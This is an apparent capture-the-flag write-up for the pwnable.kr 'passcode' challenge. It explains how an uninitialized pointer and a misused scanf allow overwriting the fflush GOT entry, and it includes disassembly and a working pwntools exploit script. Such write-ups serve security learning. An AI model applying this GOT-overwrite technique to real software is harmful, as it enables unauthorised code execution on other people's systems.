We have a buffer of size 100, and the same addresses are going to be reused when the program will call ``login``, so the 4 last bytes will be the value for the uninitialized ``passcode1``. This let us choose the value of this variable.
Moreover, ``scanf`` is misused: ``scanf("%d", passcode1);``: as long as we control ``passcode1``, we can write data to arbitrary locations in memory through this scanf.
We are going to use it to modify the ``fflush`` GOT entry. By doing so, next time ``fflush`` will be called, it will jump to an address chosen by us.
When we open the ELF with a disassembler, we find :

```
0x080485d7      c70424a58704   mov dword [esp], str.Login_OK_      
0x080485de      e86dfeffff     call sym.imp.puts               
0x080485e3      c70424af8704   mov dword [esp], str._bin_cat_flag 
0x080485ea      e871feffff     call sym.imp.system                 
```


```python
from pwn import *
elf = ELF("passcode")

bincatflag_str = list(elf.search("/bin"))[0]
catflag_instr  = list(elf.search(asm("mov dword ptr [esp], "+str(bincatflag_str))))[0]

payload1 = ("A"*96)+p32(elf.got["fflush"])
payload2 = str(catflag_instr[0])

shell = ssh("passcode", "pwnable.kr", password="guest", port=2222)
p = shell.process("./passcode")
p.recvuntil("name : ")
p.sendline(payload1)
p.recvuntil("passcode1 : ")
p.sendline(payload2)
p.interactive()
```
